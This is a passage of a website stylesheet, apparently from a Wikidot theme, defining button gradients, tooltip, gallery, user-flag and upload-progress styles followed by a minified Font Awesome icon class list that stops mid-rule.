    background-image: linear-gradient(top, rgba(255,255,255,.4), rgba(150,150,150,.3), rgba(0,0,0,.0)) !important;
    background-image: -moz-linear-gradient(top, rgba(255,255,255,.4), rgba(150,150,150,.3), rgba(0,0,0,.0)) !important;
    background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(rgba(255,255,255,.4)), color-stop(0.5, rgba(150,150,150,.3)), to(rgba(0,0,0,.0))) !important;
}
.awesome:active	{ 
    background-image: linear-gradient(top, rgba(0,0,0,.2), rgba(150,150,150,.2), rgba(255,255,255,.2)) !important;
    background-image: -moz-linear-gradient(top, rgba(0,0,0,.2), rgba(150,150,150,.2), rgba(255,255,255,.2)) !important;
    background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(rgba(0,0,0,.2)), color-stop(0.5, rgba(150,150,150,.2)), to(rgba(255,255,255,.2))) !important;

    box-shadow: inset 0 1px 2px rgba(0,0,0,0.7) !important;
    -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.7) !important; 
    -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.7) !important;
}

.awesome.blue, .awesome.blue:hover {
    background-color: #0A50FF;
}
.awesome.darkblue, .awesome.darkblue:hover {
    background-color: #0A50AA;
}
.awesome.red, .awesome.red:hover {
    background-color: #e33100;
}
.awesome.green, .awesome.green:hover {
    background-color: #3ACC00;
}
.awesome.grey, .awesome.grey:hover {
    background-color: #777;
}


@media screen and (-webkit-min-device-pixel-ratio:0){
    .awesome:active	{ 
        -webkit-box-shadow: none;
    }
}

.awesome.small 	        { padding: 4px 7px 5px; font-size: 10px; }
.awesome.small:active	{ padding: 5px 7px 4px; }
.awesome.medium         {  }
.awesome.medium:active	{ padding: 6px 10px 5px; }
.awesome.large 	        { padding: 8px 14px 9px; font-size: 14px; }
.awesome.large:active	{ padding: 9px 14px 8px; }
.awesome.larger 	    { padding: 10px 17px 11px; font-size: 16px; }
.awesome.larger:active	{ padding: 11px 17px 10px; }
.awesome.huge 	        { padding: 12px 22px 13px; font-size: 18px; }
.awesome.huge:active	{ padding: 13px 22px 12px; }


table.guest-commenting {
    border-collapse: collapse;
    border: 0;
    padding: 0;
    margin-bottom: 2px;
}

table.guest-commenting td {
    padding: 2px 6px 0 0;
}

table.guest-commenting td input {
    margin: 0;
}

table.guest-commenting td label.hint {
    color: #666;
}


.wikidot-hybrid-module-loading {
    padding-top: 20px;
    background: no-repeat center center url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/progress/progressbar.gif");
}



#tiptip_holder {
	display: none;
	position: absolute;
	top: 0;
	left: 0;
	z-index: 99999;
}

#tiptip_holder.tip_top {
	padding-bottom: 5px;
}

#tiptip_holder.tip_bottom {
	padding-top: 5px;
}

#tiptip_holder.tip_right {
	padding-left: 5px;
}

#tiptip_holder.tip_left {
	padding-right: 5px;
}

#tiptip_content {
	font-size: 11px;
	color: #fff;
	text-shadow: 0 0 2px #000;
	padding: 4px 8px;
	border: 1px solid rgba(255,255,255,0.25);
	background-color: rgb(25,25,25);
	background-color: rgba(25,25,25,0.92);
	background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(transparent), to(#000));
	border-radius: 3px;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	box-shadow: 0 0 3px #555;
	-webkit-box-shadow: 0 0 3px #555;
	-moz-box-shadow: 0 0 3px #555;
}

#tiptip_arrow, #tiptip_arrow_inner {
	position: absolute;
	border-color: transparent;
	border-style: solid;
	border-width: 6px;
	height: 0;
	width: 0;
}

#tiptip_holder.tip_top #tiptip_arrow {
	border-top-color: #fff;
	border-top-color: rgba(255,255,255,0.35);
}

#tiptip_holder.tip_bottom #tiptip_arrow {
	border-bottom-color: #fff;
	border-bottom-color: rgba(255,255,255,0.35);
}

#tiptip_holder.tip_right #tiptip_arrow {
	border-right-color: #fff;
	border-right-color: rgba(255,255,255,0.35);
}

#tiptip_holder.tip_left #tiptip_arrow {
	border-left-color: #fff;
	border-left-color: rgba(255,255,255,0.35);
}

#tiptip_holder.tip_top #tiptip_arrow_inner {
	margin-top: -7px;
	margin-left: -6px;
	border-top-color: rgb(25,25,25);
	border-top-color: rgba(25,25,25,0.92);
}

#tiptip_holder.tip_bottom #tiptip_arrow_inner {
	margin-top: -5px;
	margin-left: -6px;
	border-bottom-color: rgb(25,25,25);
	border-bottom-color: rgba(25,25,25,0.92);
}

#tiptip_holder.tip_right #tiptip_arrow_inner {
	margin-top: -6px;
	margin-left: -5px;
	border-right-color: rgb(25,25,25);
	border-right-color: rgba(25,25,25,0.92);
}

#tiptip_holder.tip_left #tiptip_arrow_inner {
	margin-top: -6px;
	margin-left: -7px;
	border-left-color: rgb(25,25,25);
	border-left-color: rgba(25,25,25,0.92);
}


@media screen and (-webkit-min-device-pixel-ratio:0) {	
	#tiptip_content {
		padding: 4px 8px 5px 8px;
		background-color: rgba(45,45,45,0.88);
	}
	#tiptip_holder.tip_bottom #tiptip_arrow_inner { 
		border-bottom-color: rgba(45,45,45,0.88);
	}
	#tiptip_holder.tip_top #tiptip_arrow_inner { 
		border-top-color: rgba(20,20,20,0.92);
	}
}

.gallery-image-size-small {
  max-width: 240px;
  max-height: 240px;
}
.gallery-image-size-medium  {
  max-width: 500px;
  max-height: 500px;
}
.gallery-image-size-thumbnail {
  max-width: 100px;
  max-height: 100px;
}
.gallery-image-size-square {
  max-width: 75px;
  max-height: 75px;
}

#new-post-div input.text {
  font-weight:bold;
  font-size: 130%;
  width: 95%;
}

#new-post-div textarea#np-text {
  width: 95%;
}

.flag-user-ok {
  color: #4B4;
  font-size: 150%;
  border: 1px solid #000;
  padding: 3px;
  margin: 5px;
}
.flag-user-abusive {
  color: #CCC;
  font-size: 150%;
  border: 1px solid #DDD;
  padding: 3px;
  margin: 5px;
  text-decoration: none;
}

.unflag-user-ok {
  color: #CCC;
  font-size: 150%;
  border: 1px solid #DDD;
  padding: 3px;
  margin: 5px;
  text-decoration: none;
}

.unflag-user-abusive {
  color: #B44;
  font-size: 150%;
  border: 1px solid #000;
  padding: 3px;
  margin: 5px;
}



#upload-file-list table .progress .progress-bar {
	width: 200px;	
	left:0;margin:0;
	position: relative;
	height: 1.5em;
	z-index: 1;
}

#upload-file-list table .progress .progress-bar span{
	z-index: 2;
	position: relative;
	display: block;
	text-align: center;
	margin: 0 auto;
}

#upload-file-list table .progress .progress-bar{
	background-color: #DDD;
	width: 0;
	height: 1.5em;
	z-index: 1;
}
                    @charset "utf-8";




.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;transform:translate(0, 0)}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2);-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1);-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1);-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-genderless:before,.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content: